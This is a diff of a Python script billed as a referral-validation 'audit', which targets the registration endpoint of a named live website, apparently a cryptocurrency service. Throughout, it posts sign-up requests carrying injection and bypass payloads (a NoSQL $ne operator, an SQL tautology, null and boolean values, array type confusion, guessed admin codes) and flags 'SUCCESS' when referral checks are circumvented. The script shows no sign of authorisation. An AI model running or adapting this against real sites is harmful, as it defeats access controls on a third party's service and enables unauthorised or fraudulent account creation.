@@ -1,51 +1,54 @@
 #!/usr/bin/env python3
 """
-REFERRAL FUZZER MODULE — Registration Logic & Validation Bypass
-Target: cryptobytes.online/user/register
+REFERRAL BYPASS & FUZZING PROBE v7.2
+Evaluates Laravel registration endpoints for referral validation bypasses.
 """
 import json
 from modules.transport import SecureTransport
 
-def audit_referral_endpoint(target_url="https://cryptobytes.online"):
-    transport = SecureTransport(target_url)
-    register_path = "/user/register" # Adjust if your actual API route differs
+TARGET_URL = "https://cryptobytes.online"
+REGISTRATION_ENDPOINT = "/user/register"
+
+def audit_referral_logic():
+    transport = SecureTransport(TARGET_URL)
     
-    # Offensive test vectors targeting referral validation logic
-    fuzz_payloads = [
-        {"name": "Null Referral Code", "ref": None},
-        {"name": "Boolean True Injection", "ref": True},
-        {"name": "Empty String", "ref": ""},
-        {"name": "NoSQL Operator ($ne)", "ref": {"$ne": None}},
+    # Define offensive test vectors for the referral field
+    bypass_payloads = [
+        {"name": "Null Value Bypass", "ref": None},
+        {"name": "Boolean True Bypass", "ref": True},
+        {"name": "Empty String Bypass", "ref": ""},
+        {"name": "NoSQL Operator Bypass", "ref": {"$ne": None}},
+        {"name": "Admin Default Code", "ref": "ADMIN001"},
+        {"name": "System Root Code", "ref": "ROOT"},
         {"name": "SQL Tautology", "ref": "' OR '1'='1"},
-        {"name": "Integer Overflow / Type Confusion", "ref": 0},
-        {"name": "Common Admin / Root Placeholder", "ref": "ADMIN"},
-        {"name": "Array Wrapping", "ref": ["5702185"]}
+        {"name": "Type Confusion (Array)", "ref": ["5702185"]}
     ]
 
-    base_data = {
-        "email": "audit.test@cryptobytes.online",
-        "password": "SecurePassword123!",
-        "referral": ""
+    base_registration_data = {
+        "name": "RedTeam Auditor",
+        "email": "redteam.audit@cryptobytes.online",
+        "password": "SecureTestPassword123!",
+        "password_confirmation": "SecureTestPassword123!",
+        "terms": "1"
     }
 
-    print(f"\n[***] STARTING REFERRAL VALIDATION AUDIT AGAINST: {target_url}{register_path} [***]\n")
+    print(f"[*] Initiating referral validation audit against {TARGET_URL}{REGISTRATION_ENDPOINT}...\n")
 
-    for vector in fuzz_payloads:
-        payload = base_data.copy()
-        payload["referral"] = vector["ref"] # Change key to match your form field name (e.g., 'ref', 'referral_code', 'invite')
+    for test in bypass_payloads:
+        payload = base_registration_data.copy()
+        # Test both common Laravel referral parameter naming conventions
+        payload["referral"] = test["ref"]
+        payload["ref"] = test["ref"]
 
-        status, headers, body = transport.request("POST", register_path, payload=payload)
+        status, headers, body = transport.request("POST", REGISTRATION_ENDPOINT, payload=payload)
         
-        print(f"[-] Vector: {vector['name']} (Value: {vector['ref']})")
-        print(f"    -> Status Code: {status}")
-        print(f"    -> Response Preview: {body[:120].strip()}")
+        print(f"[-] Test: {test['name']} (Payload: {test['ref']})")
+        print(f"    -> Status: {status}")
+        print(f"    -> Response Snippet: {body[:150].strip()}\n")
 
-        if status in [200, 201] and "error" not in body.lower() and "user not found" not in body.lower():
-            print(f"\n[!] SUCCESS! Referral validation bypassed or mutated successfully using: {vector['name']}\n")
-            return vector
-
-    print("\n[-] Standard referral validations held firm. Checking if referral codes can be brute-forced or enumerated...")
-    return None
+        if status in [200, 201, 302] and "error" not in body.lower() and "user not found" not in body.lower():
+            print(f"[!] SUCCESS! Referral validation bypassed using: {test['name']}")
+            break
 
 if __name__ == "__main__":
-    audit_referral_index()
+    audit_referral_logic()
